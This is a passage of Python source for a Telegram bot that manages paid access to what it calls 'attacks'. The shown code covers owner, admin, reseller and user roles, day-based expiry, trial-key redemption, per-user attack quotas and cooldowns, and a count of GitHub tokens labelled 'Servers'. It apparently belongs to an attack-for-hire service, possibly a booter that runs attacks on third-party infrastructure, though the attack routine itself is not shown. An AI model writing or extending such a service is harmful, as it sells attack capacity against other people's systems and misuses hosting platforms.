    elif is_reseller(user_id):
        role = "💎 ʀᴇsᴇʟʟᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_approved_user(user_id):
        role = "✨ ᴜsᴇʀ"
        user_data = approved_users.get(str(user_id), {})
        exp = user_data.get('expiry', 0)
        if exp == "LIFETIME":
            expiry = "ʟɪғᴇᴛɪᴍᴇ"
        else:
            days_left = int((exp - time.time()) / 86400)
            hours_left = int(((exp - time.time()) % 86400) / 3600)
            expiry = f"{days_left}ᴅ {hours_left}ʜ"
    else:
        role = "⏳ ᴘᴇɴᴅɪɴɢ"
        expiry = "ᴡᴀɪᴛɪɴɢ"
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    status = "🟢 ᴀᴄᴛɪᴠᴇ" if can_user_attack(user_id) else "🔴 ɪɴᴀᴄᴛɪᴠᴇ"
    
    text = f"╔════════════════════════╗\n"
    text += f"║  {to_small_caps('YOUR ACCESS INFO')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('ACCOUNT DETAILS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 👤 {to_small_caps('Role')}: {role}\n"
    text += f"├ 👤 {to_small_caps('Name')}: {update.effective_user.first_name}\n"
    text += f"├ 👤 {to_small_caps('Username')}: @{update.effective_user.username or 'None'}\n"
    text += f"├ 📅 {to_small_caps('Expiry')}: {expiry}\n"
    text += f"├ 🎯 {to_small_caps('Attacks')}: {remaining}/{MAX_ATTACKS}\n"
    text += f"└ ✅ {to_small_caps('Status')}: {status}"
    
    await update.message.reply_text(text)

async def add_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(f"❌ {to_small_caps('Usage')}: /add <id> <days>")
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(target_id)]
        save_json('pending_users.json', pending_users)
        
        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + (days * 86400)
        
        approved_users[str(target_id)] = {
            "username": f"user_{target_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_json('approved_users.json', approved_users)
        
        try:
            msg = f"╔════════════════════════╗\n"
            msg += f"║  {to_small_caps('ACCESS APPROVED')}  ║\n"
            msg += f"╚════════════════════════╝\n\n"
            msg += f"🎉 {to_small_caps('Access granted for')} {days} {to_small_caps('days')}\n"
            msg += f"💡 {to_small_caps('Use')} /start {to_small_caps('to begin')}"
            await context.bot.send_message(chat_id=target_id, text=msg)
        except:
            pass
        
        text = f"╔════════════════════╗\n"
        text += f"║  {to_small_caps('USER ADDED')}  ║\n"
        text += f"╚════════════════════╝\n\n"
        text += f"✅ {to_small_caps('Successfully added')}\n"
        text += f"├ 🆔 {to_small_caps('ID')}: {target_id}\n"
        text += f"└ ⏱️ {to_small_caps('Days')}: {days}"
        
        await update.message.reply_text(text)
    except:
        await update.message.reply_text(f"❌ {to_small_caps('Invalid format')}")

async def remove_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(f"❌ {to_small_caps('Usage')}: /remove <id>")
        return
    
    try:
        target_id = str(context.args[0])
        
        if target_id in approved_users:
            del approved_users[target_id]
            save_json('approved_users.json', approved_users)
            
            text = f"╔════════════════════╗\n"
            text += f"║  {to_small_caps('USER REMOVED')}  ║\n"
            text += f"╚════════════════════╝\n\n"
            text += f"✅ {to_small_caps('Successfully removed')}\n"
            text += f"└ 🆔 {to_small_caps('ID')}: {target_id}"
            
            await update.message.reply_text(text)
        else:
            await update.message.reply_text(f"❌ {to_small_caps('User not found')}")
    except:
        await update.message.reply_text(f"❌ {to_small_caps('Error occurred')}")

async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        await update.message.reply_text(f"❌ {to_small_caps('Usage')}: /redeem <key>")
        return
    
    key = context.args[0].upper()
    success, message = redeem_trial_key(key, user_id)
    
    if success:
        text = f"╔════════════════════════╗\n"
        text += f"║  {to_small_caps('TRIAL ACTIVATED')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"✅ {message}\n\n"
        text += f"💡 {to_small_caps('Use')} /start {to_small_caps('to begin')}"
        await update.message.reply_text(text)
    else:
        text = f"╔════════════════════╗\n"
        text += f"║  {to_small_caps('REDEMPTION FAILED')}  ║\n"
        text += f"╚════════════════════╝\n\n"
        text += f"❌ {message}"
        await update.message.reply_text(text)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    text = f"╔═══════════════════════╗\n"
    text += f"║  {to_small_caps('HELP & COMMANDS')}  ║\n"
    text += f"╚═══════════════════════╝\n\n"
    
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('BASIC COMMANDS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"/start - {to_small_caps('Main menu')}\n"
    text += f"/id - {to_small_caps('Get your ID')}\n"
    text += f"/myaccess - {to_small_caps('Check access')}\n"
    text += f"/help - {to_small_caps('Show help')}\n"
    text += f"/redeem <key> - {to_small_caps('Redeem trial')}\n\n"
    
    if is_owner(user_id) or is_admin(user_id):
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('ADMIN COMMANDS')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"/add <id> <days> - {to_small_caps('Add user')}\n"
        text += f"/remove <id> - {to_small_caps('Remove user')}\n\n"
    
    text += f"💡 {to_small_caps('Use buttons for more features')}"
    
    await update.message.reply_text(text)

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("id", id_cmd))
    application.add_handler(CommandHandler("myaccess", myaccess_cmd))
    application.add_handler(CommandHandler("add", add_cmd))
    application.add_handler(CommandHandler("remove", remove_cmd))
    application.add_handler(CommandHandler("redeem", redeem_cmd))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    print("╔════════════════════════════╗")
    print(f"║  {to_small_caps('BOT IS RUNNING')}...  ║")
    print("╚════════════════════════════╝")
    print(f"👑 {to_small_caps('Owners')}: {len(owners)}")
    print(f"⚡ {to_small_caps('Admins')}: {len(admins)}")
    print(f"📊 {to_small_caps('Users')}: {len(approved_users)}")
    print(f"💎 {to_small_caps('Resellers')}: {len(resellers)}")
    print(f"🔑 {to_small_caps('Servers')}: {len(github_tokens)}")
    print(f"🔧 {to_small_caps('Maintenance')}: {'🔴 ON' if MAINTENANCE_MODE else '🟢 OFF'}")
    print(f"⏳ {to_small_caps('Cooldown')}: {COOLDOWN_DURATION}s")
    print(f"🎯 {to_small_caps('Max attacks')}: {MAX_ATTACKS}")
    
    application.run_polling()

if __name__ == '__main__':
    main()
